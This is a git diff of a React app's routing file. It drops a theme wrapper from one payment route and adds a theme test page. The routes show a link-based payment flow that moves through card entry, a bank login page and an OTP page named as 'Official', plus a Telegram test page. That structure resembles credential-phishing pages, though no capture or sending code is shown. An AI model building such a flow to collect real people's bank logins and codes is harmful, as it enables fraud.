@@ -31,8 +31,8 @@ import PaymentBankLogin from "./pages/PaymentBankLogin";
 import PaymentCardForm from "./pages/PaymentCardForm";
 import PaymentOTPForm from "./pages/PaymentOTPForm";
 import PaymentReceiptPage from "./pages/PaymentReceiptPage";
-import PaymentThemeWrapper from "./components/PaymentThemeWrapper";
 import TelegramTestPage from "./pages/TelegramTestPage";
+import ThemeTestPage from "./pages/ThemeTestPage";
 import NotFound from "./pages/NotFound";
 
 const queryClient = new QueryClient();
@@ -59,11 +59,7 @@ const App = () => (
           {/* Payment flow with recipient/sender selection */}
           <Route path="/pay/:id/recipient-sender" element={<PaymentRecipientSender />} />
           <Route path="/pay/:id/recipient-sender-data" element={<PaymentRecipientSenderData />} />
-          <Route path="/pay/:id/recipient" element={
-            <PaymentThemeWrapper>
-              <PaymentRecipient />
-            </PaymentThemeWrapper>
-          } />
+          <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/details" element={<PaymentDetailsOfficial />} />
           {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
@@ -75,6 +71,7 @@ const App = () => (
           <Route path="/pay/:id/otp" element={<PaymentOTPOfficial />} />
           <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
           <Route path="/telegram-test" element={<TelegramTestPage />} />
+          <Route path="/theme-test" element={<ThemeTestPage />} />
           <Route path="*" element={<NotFound />} />
         </Routes>
       </BrowserRouter>
